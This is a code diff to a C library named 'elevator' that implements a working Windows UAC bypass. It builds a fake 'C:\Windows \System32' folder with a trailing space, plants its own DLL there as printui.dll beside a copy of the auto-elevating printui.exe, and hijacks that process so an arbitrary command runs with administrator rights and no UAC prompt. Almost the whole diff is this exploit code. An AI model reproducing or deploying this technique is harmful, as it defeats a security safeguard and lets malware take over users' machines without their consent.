@@ -22,19 +22,116 @@
  * WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  */
 
+#include <stdlib.h>
+#include <string.h>
+
 #define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
 
 #define _ELEVATOR_INTERNAL
 #include <elevator.h>
 
+static int setUpEnvironment() {
+    // Look up path to the loaded DLL file
+    HMODULE module;
+    WCHAR filename[MAX_PATH];
+    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR) &elevator, &module) == FALSE) {
+        return 1;
+    }
+    if (GetModuleFileNameW(module, filename, MAX_PATH) == FALSE) {
+        return 1;
+    }
+
+    // Create the mock system folders
+    if (CreateDirectoryW(L"\\\\?\\C:\\Windows \\", NULL) == FALSE) {
+        return 1;
+    }
+    if (CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32\\", NULL) == FALSE) {
+        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
+        return 1;
+    }
+
+    // Copy the loaded DLL file into the mock System32 folder under the name printui.dll for hijacking
+    if (CopyFileW(filename, L"\\\\?\\C:\\Windows \\System32\\printui.dll", TRUE) == FALSE) {
+        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\");
+        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
+        return 1;
+    }
+
+    // Copy the real printui.exe file into the mock System32 folder next to the fake printui.dll file
+    // This particular EXE is one of several that automatically elevates itself without presenting UAC dialog
+    if (CopyFileW(L"C:\\Windows\\System32\\printui.exe", L"\\\\?\\C:\\Windows \\System32\\printui.exe", TRUE) == FALSE) {
+        DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.dll");
+        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\");
+        RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
+        return 1;
+    }
+
+    return 0;
+}
+
+static int tearDownEnvironment() {
+    // Delete the copy of printui.exe and the fake printui.dll
+    if (DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.exe") == FALSE) {
+        return 1;
+    }
+    if (DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\printui.dll") == FALSE) {
+        return 1;
+    }
+
+    // Delete the mock system folders
+    if (RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32\\") == FALSE) {
+        return 1;
+    }
+    if (RemoveDirectoryW(L"\\\\?\\C:\\Windows \\") == FALSE) {
+        return 1;
+    }
+
+    return 0;
+}
+
 int elevator(const char* command) {
-    return 1;
+    // Allocate and build the full command line string
+    const char* commandPrefix = "cmd /c C:\\Windows\" \"\\System32\\printui.exe ";
+    const char* commandSuffix = command;
+    command = strcat((char*) realloc(_strdup(commandPrefix),strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);
+
+    // Set up the elevation environment
+    if (setUpEnvironment()) {
+        return 1;
+    }
+
+    // Aaaaaaand run it...
+    system(command);
+
+    // Deallocate the full command string
+    free((void*) command);
+
+    // Tear down the elevation environment
+    if (tearDownEnvironment()) {
+        return 1;
+    }
+
+    return 0;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
+        case DLL_PROCESS_ATTACH: {
+            // A string to search for to see if we're in the surrogate process
+            const char magic[] = "\"C:\\Windows \\System32\\printui.exe\" ";
+
+            // The full command line string of this process
+            const char* cmdline = GetCommandLineA();
+
+            // If it looks like we just attached to the auto-elevating host process
+            if (memcmp(cmdline, magic, sizeof magic - 1) == 0) {
+                // We are elevated, so slice off and execute the user's command string!
+                system(&cmdline[sizeof magic]);
+            }
+
+            return TRUE;
+        }
         case DLL_PROCESS_DETACH:
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
